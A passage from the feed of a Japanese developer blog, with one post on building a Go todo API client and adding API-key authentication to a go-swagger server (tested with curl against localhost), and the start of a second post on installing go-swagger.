        &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;log&quot;&lt;/span&gt;&lt;span class=&quot;x&quot;&gt;
        &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_&lt;/span&gt;&lt;span class=&quot;x&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;reflect&quot;&lt;/span&gt;&lt;span class=&quot;x&quot;&gt;

        &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;apiclient&lt;/span&gt;&lt;span class=&quot;x&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;github.com/KosukeShimofuji/todos/client&quot;&lt;/span&gt;&lt;span class=&quot;x&quot;&gt;
        &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;github.com/KosukeShimofuji/todos/client/todos&quot;&lt;/span&gt;&lt;span class=&quot;x&quot;&gt;
        &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;github.com/KosukeShimofuji/todos/models&quot;&lt;/span&gt;&lt;span class=&quot;x&quot;&gt;
        &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;httptransport&lt;/span&gt;&lt;span class=&quot;x&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;github.com/go-openapi/runtime/client&quot;&lt;/span&gt;&lt;span class=&quot;x&quot;&gt;
        &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_&lt;/span&gt;&lt;span class=&quot;x&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;github.com/go-openapi/spec&quot;&lt;/span&gt;&lt;span class=&quot;x&quot;&gt;
        &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;github.com/go-openapi/strfmt&quot;&lt;/span&gt;&lt;span class=&quot;x&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;x&quot;&gt;

&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;func&lt;/span&gt;&lt;span class=&quot;x&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;str2ptr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;x&quot;&gt; &lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;string&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;x&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;string&lt;/span&gt;&lt;span class=&quot;x&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;x&quot;&gt;
        &lt;/span&gt;&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt;&lt;span class=&quot;x&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;x&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;x&quot;&gt;

&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;func&lt;/span&gt;&lt;span class=&quot;x&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;write&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;client&lt;/span&gt;&lt;span class=&quot;x&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;apiclient&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;TodoList&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;x&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;x&quot;&gt;
        &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;item&lt;/span&gt;&lt;span class=&quot;x&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:=&lt;/span&gt;&lt;span class=&quot;x&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;new&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;models&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Item&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;x&quot;&gt;
        &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;item&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Description&lt;/span&gt;&lt;span class=&quot;x&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;x&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;str2ptr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Hello World&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;x&quot;&gt;
        &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;x&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:=&lt;/span&gt;&lt;span class=&quot;x&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;todos&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;NewAddOneParams&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;&lt;span class=&quot;x&quot;&gt;
        &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;SetBody&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;item&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;x&quot;&gt;

        &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;resp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;x&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;err&lt;/span&gt;&lt;span class=&quot;x&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:=&lt;/span&gt;&lt;span class=&quot;x&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;client&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Todos&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;AddOne&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;x&quot;&gt;
        &lt;/span&gt;&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;x&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;err&lt;/span&gt;&lt;span class=&quot;x&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt;&lt;span class=&quot;x&quot;&gt; &lt;/span&gt;&lt;span class=&quot;no&quot;&gt;nil&lt;/span&gt;&lt;span class=&quot;x&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;x&quot;&gt;
                &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Fatal&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;err&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;x&quot;&gt;
        &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;x&quot;&gt;
        &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fmt&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;%#v&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;x&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;resp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;x&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;x&quot;&gt;

&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;func&lt;/span&gt;&lt;span class=&quot;x&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;read&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;client&lt;/span&gt;&lt;span class=&quot;x&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;apiclient&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;TodoList&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;x&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;x&quot;&gt;
        &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;x&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:=&lt;/span&gt;&lt;span class=&quot;x&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;todos&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;NewFindTodosParams&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;&lt;span class=&quot;x&quot;&gt;

        &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;resp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;x&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;err&lt;/span&gt;&lt;span class=&quot;x&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:=&lt;/span&gt;&lt;span class=&quot;x&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;client&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Todos&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;FindTodos&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;x&quot;&gt;
        &lt;/span&gt;&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;x&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;err&lt;/span&gt;&lt;span class=&quot;x&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt;&lt;span class=&quot;x&quot;&gt; &lt;/span&gt;&lt;span class=&quot;no&quot;&gt;nil&lt;/span&gt;&lt;span class=&quot;x&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;x&quot;&gt;
                &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Fatal&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;err&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;x&quot;&gt;
        &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;x&quot;&gt;
        &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fmt&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;%#v&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;x&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;resp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;x&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;x&quot;&gt;

&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;func&lt;/span&gt;&lt;span class=&quot;x&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;&lt;span class=&quot;x&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;x&quot;&gt;
        &lt;/span&gt;&lt;span class=&quot;c&quot;&gt;// create the transport&lt;/span&gt;&lt;span class=&quot;x&quot;&gt;
        &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;transport&lt;/span&gt;&lt;span class=&quot;x&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:=&lt;/span&gt;&lt;span class=&quot;x&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;httptransport&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;New&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;127.0.0.1:54931&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;x&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;x&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;string&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;http&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;})&lt;/span&gt;&lt;span class=&quot;x&quot;&gt;

        &lt;/span&gt;&lt;span class=&quot;c&quot;&gt;// create the API client, with the transport&lt;/span&gt;&lt;span class=&quot;x&quot;&gt;
        &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;client&lt;/span&gt;&lt;span class=&quot;x&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:=&lt;/span&gt;&lt;span class=&quot;x&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;apiclient&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;New&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;transport&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;x&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;strfmt&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Default&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;x&quot;&gt;
        &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fmt&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Println&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;[+] Execute AddOne&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;x&quot;&gt;
        &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;write&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;client&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;x&quot;&gt;
        &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fmt&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Println&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;[+] Execute FindTodos&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;x&quot;&gt;
        &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;read&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;client&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;x&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;x&quot;&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;ul&gt;
  &lt;li&gt;実行&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ go run client.go
[+] Execute AddOne
&amp;amp;models.Item{Completed:false, Description:(*string)(0xc4200f6d60), ID:9}
[+] Execute FindTodos
[]*models.Item{(*models.Item)(0xc42031cce0), (*models.Item)(0xc42031cd00), (*models.Item)(0xc42031cd20), (*models.Item)(0xc42031cd40), (*models.Item)(0xc42031cda0), (*models.Item)(0xc42031cdc0), (*models.Item)(0xc42031ce00), (*models.Item)(0xc42031ce20), (*models.Item)(0xc42031ce40)}
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h1 id=&quot;section-3&quot;&gt;認証&lt;/h1&gt;

&lt;p&gt;本項でははAPI KEYによる認証機能を追加する。&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://github.com/go-swagger/go-swagger/blob/master/examples/authentication/README.md&quot;&gt;Authentication sample&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;クライアント側はgo-openapi/runtime/clientにより以下の認証スキームが提供されている。&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://godoc.org/github.com/go-openapi/runtime/client#BasicAuth&quot;&gt;BasicAuth&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://godoc.org/github.com/go-openapi/runtime/client#APIKeyAuth&quot;&gt;APIKeyAuth&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://godoc.org/github.com/go-openapi/runtime/client#BearerToken&quot;&gt;BearerToken&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;まずはswagger.ymlを編集して-Pオプションをつけてサーバを作り直す。restapi/configure_todo_list.goは最初のserver用のコード生成時のみ生成されるので退避する必要はない。&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;swagger.ymlの編集内容&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ diff -u /tmp/swagger.yml.backup /tmp/swagger.yml
--- /tmp/swagger.yml.backup     2016-12-06 17:31:20.704621643 +0900
+++ /tmp/swagger.yml    2016-12-06 17:39:03.342823898 +0900
@@ -8,6 +8,13 @@
 - application/json
 produces:
 - application/json
+securityDefinitions:
+  key:
+    type: apiKey
+    in: header
+    name: x-token
+security:
+  - key: []
 schemes:
 - http
 - https
@@ -117,3 +124,5 @@
         format: int64
       message:
         type: string
+  principal:
+    type: string
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;ul&gt;
  &lt;li&gt;-Pオプションをつけてserver用のコードを生成する。&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ swagger generate server -A TodoList -P models.Principal -f /tmp/swagger.yml
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;ul&gt;
  &lt;li&gt;restapi/configure_todo_list.goに手を加える&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gh&quot;&gt;diff --git a/restapi/configure_todo_list.go b/restapi/configure_todo_list.go
index b03b1d1..bf66d2d 100644
&lt;/span&gt;&lt;span class=&quot;gd&quot;&gt;--- a/restapi/configure_todo_list.go
&lt;/span&gt;&lt;span class=&quot;gi&quot;&gt;+++ b/restapi/configure_todo_list.go
&lt;/span&gt;&lt;span class=&quot;gu&quot;&gt;@@ -107,17 +107,27 @@ func configureAPI(api *operations.TodoListAPI) http.Handler {
&lt;/span&gt;
        api.JSONProducer = runtime.JSONProducer()

&lt;span class=&quot;gd&quot;&gt;-       api.TodosAddOneHandler = todos.AddOneHandlerFunc(func(params todos.AddOneParams) middleware.Responder {
&lt;/span&gt;&lt;span class=&quot;gi&quot;&gt;+       // Applies when the &quot;x-token&quot; header is set
+       api.KeyAuth = func(token string) (*models.Principal, error) {
+               if token == &quot;abcdefuvwxyz&quot; {
+                       prin := models.Principal(token)
+                       return &amp;amp;prin, nil
+               }
+               api.Logger(&quot;Access attempt with incorrect api key auth: %s&quot;, token)
+               return nil, errors.New(401, &quot;incorrect api key auth&quot;)
+       }
+
+       api.TodosAddOneHandler = todos.AddOneHandlerFunc(func(params todos.AddOneParams, principal *models.Principal) middleware.Responder {
&lt;/span&gt;                if err := addItem(params.Body); err != nil {
                        return todos.NewAddOneDefault(500).WithPayload(&amp;amp;models.Error{Code: 500, Message: swag.String(err.Error())})
                }
                return todos.NewAddOneCreated().WithPayload(params.Body)
        })
&lt;span class=&quot;gd&quot;&gt;-       api.TodosDestroyOneHandler = todos.DestroyOneHandlerFunc(func(params todos.DestroyOneParams) middleware.Responder {
&lt;/span&gt;&lt;span class=&quot;gi&quot;&gt;+       api.TodosDestroyOneHandler = todos.DestroyOneHandlerFunc(func(params todos.DestroyOneParams, principal *models.Principal) middleware.Responder {
&lt;/span&gt;                delete(items, params.ID)
                return todos.NewDestroyOneNoContent()
        })
&lt;span class=&quot;gd&quot;&gt;-       api.TodosFindTodosHandler = todos.FindTodosHandlerFunc(func(params todos.FindTodosParams) middleware.Responder {
&lt;/span&gt;&lt;span class=&quot;gi&quot;&gt;+       api.TodosFindTodosHandler = todos.FindTodosHandlerFunc(func(params todos.FindTodosParams, principal *models.Principal) middleware.Responder {
&lt;/span&gt;                mergedParams := todos.NewFindTodosParams()
                mergedParams.Since = swag.Int64(0)
                if params.Since != nil {
&lt;span class=&quot;gu&quot;&gt;@@ -128,7 +138,7 @@ func configureAPI(api *operations.TodoListAPI) http.Handler {
&lt;/span&gt;                }
                return todos.NewFindTodosOK().WithPayload(allItems(*mergedParams.Since, *mergedParams.Limit))
        })
&lt;span class=&quot;gd&quot;&gt;-       api.TodosUpdateOneHandler = todos.UpdateOneHandlerFunc(func(params todos.UpdateOneParams) middleware.Responder {
&lt;/span&gt;&lt;span class=&quot;gi&quot;&gt;+       api.TodosUpdateOneHandler = todos.UpdateOneHandlerFunc(func(params todos.UpdateOneParams, principal *models.Principal) middleware.Responder {
&lt;/span&gt;                if err := updateItem(params.ID, params.Body); err != nil {
                        return todos.NewUpdateOneDefault(500).WithPayload(&amp;amp;models.Error{Code: 500, Message: swag.String(err.Error())})
                }
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;ul&gt;
  &lt;li&gt;読み込みテスト&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ curl -i http://127.0.0.1:59302
HTTP/1.1 401 Unauthorized
Content-Type: application/json
Date: Tue, 06 Dec 2016 08:52:40 GMT
Content-Length: 64

{&quot;code&quot;:401,&quot;message&quot;:&quot;unauthenticated for invalid credentials&quot;}
$ curl -i http://127.0.0.1:59302 -H 'Content-Type: application/json' -H 'X-Token: abcdefuvwxyz'
HTTP/1.1 200 OK
Content-Type: application/json
Date: Tue, 06 Dec 2016 08:55:06 GMT
Content-Length: 3

[]
$ curl -i http://127.0.0.1:59302 -H 'Content-Type: application/json' -H 'X-Token: XXX'
curl: (52) Empty reply from server
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;ul&gt;
  &lt;li&gt;書き込みテスト&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ curl -i http://127.0.0.1:59302 -H 'Content-Type: application/json' -d &quot;{\&quot;description\&quot;:\&quot;Hello World\&quot;}&quot; 
HTTP/1.1 401 Unauthorized
Content-Type: application/json
Date: Tue, 06 Dec 2016 08:59:07 GMT
Content-Length: 64

{&quot;code&quot;:401,&quot;message&quot;:&quot;unauthenticated for invalid credentials&quot;}
$ curl -i http://127.0.0.1:59302 -H 'Content-Type: application/json' -H 'X-Token: abcdefuvwxyz' -d &quot;{\&quot;description\&quot;:\&quot;Hello World\&quot;}&quot; 
HTTP/1.1 201 Created
Content-Type: application/json
Date: Tue, 06 Dec 2016 08:59:39 GMT
Content-Length: 37

{&quot;description&quot;:&quot;Hello World&quot;,&quot;id&quot;:1}
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h1 id=&quot;section-4&quot;&gt;参考文献&lt;/h1&gt;

&lt;ul&gt;
  &lt;li&gt;https://goswagger.io/&lt;/li&gt;
  &lt;li&gt;https://github.com/go-swagger/go-swagger&lt;/li&gt;
  &lt;li&gt;https://github.com/go-swagger/go-swagger/issues/661&lt;/li&gt;
  &lt;li&gt;https://github.com/naoina/denco&lt;/li&gt;
  &lt;li&gt;http://cuto.unirita.co.jp/gostudy/&lt;/li&gt;
&lt;/ul&gt;

</description>
        <pubDate>Tue, 06 Dec 2016 18:00:00 +0900</pubDate>
        <link>https://kosukeshimofuji.jp/2016/12/06/swagger/</link>
        <guid isPermaLink="true">https://kosukeshimofuji.jp/2016/12/06/swagger/</guid>
        
        
        <category>Develop</category>
        
      </item>
    
      <item>
        <title>Swaggerによるrestful apiの定義</title>
        <description>&lt;p&gt;go言語を使用してrestfulなapi serverを作成したい。restful
apiの定義はSwaggerで書いた方がいいということをantipopさんに教えてもらったので、やってみる。&lt;/p&gt;

&lt;h1 id=&quot;go-swagger&quot;&gt;go-swaggerのインストール&lt;/h1&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ go get -u github.com/go-swagger/go-swagger/cmd/swagger
$ swagger --help
Usage:
  swagger [OPTIONS] &amp;lt;command&amp;gt;

Swagger tries to support you as best as possible when building API's.

It aims to represent the contract of your API with a language agnostic description of your application in json or yaml.


Help Options:
  -h, --help  Show this help message

Available commands:
  generate  genererate go code
  init      initialize a spec document
  serve     serve spec and docs
  validate  validate the swagger document
  version   print the version
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h1 id=&quot;online-editorswagger&quot;&gt;Online Editorを使用してswaggerの定義を書いてみる&lt;/h1&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;http://editor.swagger.io/#/&quot;&gt;Online Editor&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;手始めにすごくシンプルなAPI SERVERを作成したいので、以下のような定義のRestful APIにする。&lt;/p&gt;

